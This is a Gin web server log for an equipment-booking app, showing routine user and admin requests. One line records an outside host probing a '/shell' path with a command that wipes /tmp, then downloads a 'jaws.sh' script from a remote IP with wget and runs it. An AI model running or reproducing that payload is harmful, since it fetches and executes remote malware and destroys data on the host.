nohup: ignoring input
[GIN] 2023/03/31 - 20:17:55 | 307 |     367.238µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:14 | 200 |     433.367µs | 116.130.190.168 | GET      "/static/css/admin.css"
[GIN] 2023/04/03 - 08:28:14 | 307 |      98.554µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:14 | 200 |     964.473µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:16 | 307 |     157.851µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:16 | 200 |    1.250934ms | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:20 | 200 |    3.595414ms | 116.130.190.168 | GET      "/admin/users"
[GIN] 2023/04/03 - 08:28:20 | 307 |      82.443µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:20 | 200 |      806.53µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:22 | 200 |    3.589266ms | 116.130.190.168 | POST     "/admin/users/userSearch?dept=&name="
[GIN] 2023/04/03 - 08:28:34 | 200 |    1.590987ms | 116.130.190.168 | POST     "/admin/users/userSearch?dept=%E6%99%BA%E5%8C%BB&name="
[GIN] 2023/04/03 - 08:28:42 | 200 |    3.617284ms | 116.130.190.168 | POST     "/admin/users/userSearch?dept=&name="
[GIN] 2023/04/03 - 08:28:48 | 307 |     155.869µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:48 | 200 |    1.206249ms | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:50 | 200 |    3.627839ms | 116.130.190.168 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 08:28:50 | 304 |     361.923µs | 116.130.190.168 | GET      "/static/js/admin_equipment.js"
[GIN] 2023/04/03 - 08:28:50 | 307 |       98.24µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:50 | 200 |     984.547µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:28:55 | 307 |      60.685µs | 116.130.190.168 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 08:28:55 | 200 |     678.068µs | 116.130.190.168 | GET      "/home/index"
[GIN] 2023/04/03 - 08:29:03 | 200 |    1.085157ms | 116.130.190.168 | GET      "/home/status"
[GIN] 2023/04/03 - 08:29:03 | 200 |    7.941987ms | 116.130.190.168 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 08:29:05 | 200 |    2.324592ms | 116.130.190.168 | GET      "/home/me"
[GIN] 2023/04/03 - 08:34:55 | 200 |     1.14912ms | 116.130.190.168 | GET      "/home/status"
[GIN] 2023/04/03 - 08:34:55 | 200 |    6.443204ms | 116.130.190.168 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 08:34:59 | 200 |    1.143583ms | 116.130.190.168 | GET      "/home/me"
[GIN] 2023/04/03 - 08:35:01 | 200 |      597.31µs | 116.130.190.168 | GET      "/home/appoint"
[GIN] 2023/04/03 - 08:35:01 | 200 |    1.387951ms | 116.130.190.168 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 13:10:14 | 400 | 12.009423376s |   45.239.220.40 | GET      "/shell?cd+/tmp;rm+-rf+*;wget+185.254.37.25/jaws.sh;chmod+777+/tmp/jaws.sh;sh+/tmp/jaws.sh"
2023/04/03 13:10:14 http: URL query contains semicolon, which is no longer a supported separator; parts of the query may be stripped when parsed; see golang.org/issue/25192
[GIN] 2023/04/03 - 19:59:39 | 307 |     122.739µs |     192.168.2.1 | GET      "/"
[GIN] 2023/04/03 - 19:59:39 | 307 |     119.758µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 19:59:39 | 200 |      149.11µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 19:59:39 | 304 |     422.124µs |     192.168.2.1 | GET      "/static/css/login.css"
[GIN] 2023/04/03 - 19:59:40 | 307 |      85.128µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 19:59:40 | 307 |       95.61µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 19:59:40 | 200 |       97.61µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 19:59:42 | 200 |    1.813736ms |     192.168.2.1 | POST     "/login"
[GIN] 2023/04/03 - 19:59:42 | 200 |    1.147967ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 19:59:42 | 304 |     369.699µs |     192.168.2.1 | GET      "/static/css/common.css"
[GIN] 2023/04/03 - 19:59:42 | 304 |     381.347µs |     192.168.2.1 | GET      "/static/js/index.js"
[GIN] 2023/04/03 - 19:59:42 | 200 |    2.330786ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 19:59:42 | 307 |     104.221µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 19:59:42 | 304 |     471.234µs |     192.168.2.1 | GET      "/static/img/equipment.ico"
[GIN] 2023/04/03 - 19:59:42 | 200 |    1.082097ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 19:59:47 | 200 |    1.162837ms |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 19:59:47 | 200 |    6.125719ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 19:59:49 | 200 |    2.146881ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:03:11 | 200 |    1.133616ms |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 20:03:11 | 200 |    6.046113ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:03:15 | 200 |    1.150449ms |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/03 - 20:03:15 | 200 |    2.800688ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:03:17 | 200 |    2.309139ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:03:18 | 200 |   11.032775ms |     192.168.2.1 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:03:18 | 304 |     384.311µs |     192.168.2.1 | GET      "/static/js/admin.js"
[GIN] 2023/04/03 - 20:03:18 | 307 |      91.091µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:18 | 200 |    1.002062ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:21 | 307 |     107.203µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:21 | 200 |    1.111375ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:23 | 200 |    3.524698ms |     192.168.2.1 | GET      "/admin/users"
[GIN] 2023/04/03 - 20:03:23 | 304 |     380.106µs |     192.168.2.1 | GET      "/static/css/admin.css"
[GIN] 2023/04/03 - 20:03:23 | 307 |     101.814µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:23 | 200 |    1.085173ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:25 | 200 |    3.540883ms |     192.168.2.1 | POST     "/admin/users/userSearch?dept=&name="
[GIN] 2023/04/03 - 20:03:31 | 307 |     137.221µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:31 | 200 |    1.173375ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:33 | 200 |    1.651609ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:03:33 | 304 |     200.979µs |     192.168.2.1 | GET      "/static/js/admin_equipment.js"
[GIN] 2023/04/03 - 20:03:33 | 307 |      56.092µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:33 | 200 |     583.549µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:36 | 307 |      58.684µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:36 | 200 |     627.326µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:39 | 200 |   11.119775ms |     192.168.2.1 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:03:39 | 307 |      96.036µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:39 | 200 |      942.86µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:42 | 200 |    4.189135ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=14&equipmentID="
[GIN] 2023/04/03 - 20:03:46 | 307 |     108.795µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:46 | 200 |    1.214911ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:48 | 200 |    2.369101ms |     192.168.2.1 | GET      "/admin/requestings"
[GIN] 2023/04/03 - 20:03:48 | 307 |      193.85µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:48 | 200 |     1.02971ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:50 | 307 |     216.461µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:50 | 200 |    1.149579ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:52 | 200 |    2.518637ms |     192.168.2.1 | GET      "/admin/ongoings"
[GIN] 2023/04/03 - 20:03:52 | 307 |     108.444µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:52 | 200 |     960.303µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:03:55 | 307 |     111.999µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:03:55 | 200 |    1.079468ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:04:28 | 200 |    1.190671ms |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 20:04:28 | 200 |    6.347665ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:04:30 | 200 |    2.345454ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:04:38 | 200 |     137.998µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 20:04:38 | 307 |     238.794µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:04:38 | 200 |    1.052136ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:04:40 | 200 |     147.572µs |     192.168.2.1 | GET      "/signup"
[GIN] 2023/04/03 - 20:04:40 | 200 |     475.106µs |     192.168.2.1 | GET      "/static/css/signup.css"
[GIN] 2023/04/03 - 20:04:40 | 200 |     464.846µs |     192.168.2.1 | GET      "/static/js/signup.js"
[GIN] 2023/04/03 - 20:04:40 | 307 |     211.757µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:04:40 | 200 |      1.2553ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:04:43 | 200 |     134.943µs |     192.168.2.1 | GET      "/login"
[GIN] 2023/04/03 - 20:04:43 | 307 |     207.183µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:04:43 | 200 |    1.144209ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:04:46 | 200 |      1.8397ms |     192.168.2.1 | POST     "/login"
[GIN] 2023/04/03 - 20:04:46 | 200 |    1.118468ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:04:46 | 307 |      107.74µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:04:46 | 200 |    1.149967ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:04:46 | 200 |     2.61458ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:04:49 | 200 |    1.334058ms |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/03 - 20:04:49 | 200 |    4.621001ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:04:51 | 200 |    2.291066ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:04:57 | 200 |      1.2513ms |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 20:04:57 | 200 |    6.267963ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:04:59 | 200 |     2.37225ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:05:02 | 200 |    1.143282ms |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 20:05:02 | 200 |    6.191945ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:05:04 | 200 |     2.28114ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:05:07 | 200 |    1.241207ms |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/03 - 20:05:07 | 200 |    2.837504ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:11:27 | 200 |    2.348844ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:11:31 | 200 |     5.06459ms |     192.168.2.1 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:11:31 | 304 |     215.701µs |     192.168.2.1 | GET      "/static/css/index.css"
[GIN] 2023/04/03 - 20:11:31 | 307 |      60.444µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:11:31 | 200 |     596.346µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:11:35 | 200 |    4.282636ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=14&equipmentID="
[GIN] 2023/04/03 - 20:11:45 | 200 |    4.048954ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=2&equipmentID="
[GIN] 2023/04/03 - 20:12:00 | 307 |     140.461µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:12:00 | 200 |    1.067284ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:12:02 | 200 |   12.027845ms |     192.168.2.1 | GET      "/admin/all?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:12:02 | 307 |      96.073µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:12:02 | 200 |     958.823µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:12:08 | 200 |    4.059547ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=14&equipmentID="

2023/04/03 20:12:14 [31;1m/home/huonwe/agointment/handlers_admin.go:92 [35;1mrecord not found
[0m[33m[0.402ms] [34;1m[rows:0][0m SELECT * FROM `requests` WHERE `requests`.`id` = 8 AND `requests`.`deleted` IS NULL LIMIT 1
[GIN] 2023/04/03 - 20:12:14 | 200 |      2.8688ms |     192.168.2.1 | GET      "/admin/requestingsOp?op=detail&requestID=8&equipmentID="
[GIN] 2023/04/03 - 20:12:20 | 307 |      111.74µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:12:20 | 200 |    1.086543ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:12:22 | 200 |    3.525237ms |     192.168.2.1 | GET      "/admin/users"
[GIN] 2023/04/03 - 20:12:22 | 307 |     105.388µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:12:23 | 200 |    1.057414ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:12:30 | 307 |      60.277µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:12:30 | 200 |     627.382µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:12:33 | 200 |    1.720259ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:12:33 | 307 |       56.98µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:12:33 | 200 |     621.993µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:12:38 | 200 |   12.476602ms |     192.168.2.1 | GET      "/equipment/equipmentOp?op=disable&id=1"
[GIN] 2023/04/03 - 20:12:40 | 200 |    3.681533ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:12:40 | 307 |     105.091µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:12:40 | 200 |    1.183098ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:12:42 | 307 |     180.591µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:12:42 | 200 |    1.169821ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:12:44 | 200 |     1.07808ms |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/03 - 20:12:44 | 200 |    2.571305ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:12:45 | 200 |    2.126235ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:12:52 | 200 |    1.089174ms |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 20:12:52 | 200 |    6.302467ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:12:55 | 200 |    2.348678ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:13:43 | 200 |     1.54828ms |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/03 - 20:13:43 | 200 |    2.785395ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:13:45 | 200 |    2.308289ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:13:48 | 200 |    1.075784ms |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 20:13:48 | 200 |    6.185376ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:13:52 | 200 |    2.250994ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:13:53 | 200 |    1.144951ms |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/03 - 20:13:53 | 200 |    2.668322ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:16:52 | 200 |    1.208246ms |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 20:16:52 | 200 |    6.382133ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:16:53 | 200 |    2.334734ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:16:55 | 200 |    3.478332ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:16:55 | 307 |     106.147µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:16:55 | 200 |    1.140469ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:16:57 | 200 |   16.575261ms |     192.168.2.1 | GET      "/equipment/equipmentOp?op=enable&id=1"
[GIN] 2023/04/03 - 20:16:59 | 200 |       3.415ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:16:59 | 307 |     105.665µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:16:59 | 200 |     1.11397ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:17:00 | 200 |   12.623342ms |     192.168.2.1 | GET      "/equipment/equipmentOp?op=disable&id=2"
[GIN] 2023/04/03 - 20:17:01 | 200 |    3.396389ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:17:01 | 307 |     108.277µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:17:01 | 200 |    1.092043ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:17:03 | 307 |    1.841647ms |     192.168.2.1 | GET      "/equipment/getTemplate"
[GIN] 2023/04/03 - 20:17:03 | 200 |     870.916µs |     192.168.2.1 | GET      "/static/template/template.xlsx"
[GIN] 2023/04/03 - 20:17:11 | 307 |   52.172811ms |     192.168.2.1 | GET      "/equipment/export"
[GIN] 2023/04/03 - 20:17:11 | 200 |      2.0837ms |     192.168.2.1 | GET      "/static/files/export_20230403201711.xlsx"
[GIN] 2023/04/03 - 20:17:32 | 200 |     511.475µs |     192.168.2.1 | GET      "/static/files/export_20230403201711.xlsx"
[GIN] 2023/04/03 - 20:17:40 | 307 |    49.12753ms |     192.168.2.1 | GET      "/equipment/export"
[GIN] 2023/04/03 - 20:17:40 | 200 |     633.919µs |     192.168.2.1 | GET      "/static/files/export_20230403201740.xlsx"
[GIN] 2023/04/03 - 20:17:47 | 307 |   47.888988ms |     192.168.2.1 | GET      "/equipment/export"
[GIN] 2023/04/03 - 20:17:47 | 200 |     607.419µs |     192.168.2.1 | GET      "/static/files/export_20230403201747.xlsx"
[GIN] 2023/04/03 - 20:18:08 | 200 |      884.99µs |     192.168.2.1 | GET      "/static/files/export_20230403201747.xlsx"
[GIN] 2023/04/03 - 20:25:04 | 200 |   22.103275ms |     192.168.2.1 | GET      "/equipment/equipmentOp?op=del&id=2"
[GIN] 2023/04/03 - 20:25:05 | 200 |    3.366666ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:25:05 | 307 |     165.924µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:25:05 | 200 |    1.354097ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:25:07 | 200 |   25.045242ms |     192.168.2.1 | GET      "/equipment/equipmentOp?op=del&id=1"
[GIN] 2023/04/03 - 20:25:08 | 200 |    2.903764ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:25:08 | 307 |     110.295µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:25:08 | 200 |     981.526µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:25:10 | 307 |   25.813568ms |     192.168.2.1 | GET      "/equipment/export"
[GIN] 2023/04/03 - 20:25:10 | 200 |     595.086µs |     192.168.2.1 | GET      "/static/files/export_20230403202510.xlsx"
[GIN] 2023/04/03 - 20:25:32 | 200 |     777.862µs |     192.168.2.1 | GET      "/static/files/export_20230403202510.xlsx"
[GIN] 2023/04/03 - 20:26:13 | 307 |     205.257µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:26:13 | 200 |    1.201227ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:26:14 | 200 |    3.001337ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:26:14 | 200 |     677.825µs |     192.168.2.1 | GET      "/static/css/common.css"
[GIN] 2023/04/03 - 20:26:14 | 200 |     367.996µs |     192.168.2.1 | GET      "/static/js/admin_equipment.js"
[GIN] 2023/04/03 - 20:26:14 | 307 |     101.332µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:26:14 | 200 |    1.106118ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:26:16 | 200 |     2.65923ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:26:16 | 200 |     821.769µs |     192.168.2.1 | GET      "/static/css/common.css"
[GIN] 2023/04/03 - 20:26:16 | 200 |     433.513µs |     192.168.2.1 | GET      "/static/js/admin_equipment.js"
[GIN] 2023/04/03 - 20:26:16 | 307 |     104.332µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:26:16 | 200 |    1.165543ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:26:19 | 307 |     294.015µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:26:19 | 200 |    1.160283ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:26:19 | 200 |    2.228364ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:26:20 | 200 |    1.093933ms |     192.168.2.1 | GET      "/home/appoint"
[GIN] 2023/04/03 - 20:26:20 | 200 |    2.507713ms |     192.168.2.1 | GET      "/equipment/availiable?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:26:23 | 200 |    2.307215ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:26:26 | 200 |     615.753µs |     192.168.2.1 | GET      "/home/status"
[GIN] 2023/04/03 - 20:26:26 | 200 |    3.362555ms |     192.168.2.1 | GET      "/user/myRequest?name=&page=1&pageSize=15"
[GIN] 2023/04/03 - 20:26:29 | 200 |    1.213949ms |     192.168.2.1 | GET      "/home/me"
[GIN] 2023/04/03 - 20:31:13 | 200 |    1.661852ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:31:14 | 307 |       71.11µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:31:14 | 200 |     641.882µs |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:31:15 | 200 |    3.210057ms |     192.168.2.1 | GET      "/admin/equipment?page=1&pageSize=18"
[GIN] 2023/04/03 - 20:31:15 | 200 |     829.509µs |     192.168.2.1 | GET      "/static/css/common.css"
[GIN] 2023/04/03 - 20:31:15 | 200 |     480.661µs |     192.168.2.1 | GET      "/static/js/admin_equipment.js"
[GIN] 2023/04/03 - 20:31:15 | 307 |     179.201µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:31:15 | 200 |     1.08134ms |     192.168.2.1 | GET      "/home/index"
[GIN] 2023/04/03 - 20:31:18 | 307 |   25.139964ms |     192.168.2.1 | GET      "/equipment/export"
[GIN] 2023/04/03 - 20:31:18 | 200 |     750.825µs |     192.168.2.1 | GET      "/static/files/export_20230403203118.xlsx"
[GIN] 2023/04/03 - 20:31:40 | 200 |     642.382µs |     192.168.2.1 | GET      "/static/files/export_20230403203118.xlsx"
[GIN] 2023/04/03 - 20:32:07 | 307 |     137.166µs |     192.168.2.1 | GET      "/favicon.ico"
[GIN] 2023/04/03 - 20:32:07 | 200 |    1.082266ms |     192.168.2.1 | GET      "/home/index"
